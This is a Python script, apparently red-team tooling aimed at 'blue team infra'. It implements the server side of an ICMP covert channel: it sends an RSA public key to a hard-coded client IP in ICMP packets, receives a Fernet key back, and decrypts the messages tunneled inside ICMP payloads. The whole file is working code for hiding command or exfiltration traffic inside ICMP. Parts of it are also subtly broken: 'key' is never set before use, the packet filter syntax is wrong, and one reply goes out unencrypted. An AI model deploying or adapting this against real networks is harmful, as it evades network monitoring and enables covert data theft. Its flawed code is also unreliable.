# -*- coding: utf-8 -*-
"""ICMP Server

"""

#idk how to implement on blue team infra

from scapy.all import *
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import hashes
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import serialization
import base64

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

def get_packets(packet):
  global key

  if packet.haslayer(ICMP) and packet.haslayer(Raw):
    payload = packet[Raw].load

    if payload.startswith(b"KEY:"):
      encrypted_key = payload[4:]
      decode_key = base64.urlsafe_b64decode(encrypted_key)

      key = private_key.decrypt(decode_key, padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(), label=None))

    elif payload.startswith(b"MSG:") and key:
      encrypted_message = payload[4:]
      f = Fernet(key)
      decrypted_message = f.decrypt(encrypted_message).decode()
      print(decrypted_message)
public_bytes = public_key.public_bytes(encoding=serialization.Encoding.PEM, format=serialization.PublicFormat.SubjectPublicKeyInfo)

#Change client ip
client_ip = "192.168.19.131"
packet = IP(dst=client_ip)/ICMP()/Raw(load=b"PUB:" + public_bytes)
send(packet, verbose =0)

while True:
  sniff(filter="icmp and src=" + client_ip, prn=get_packets, count = 1)
  packet = IP(dst=client_ip)/ICMP()/Raw(load="MSG: connected")
  send(packet, verbose = 0)
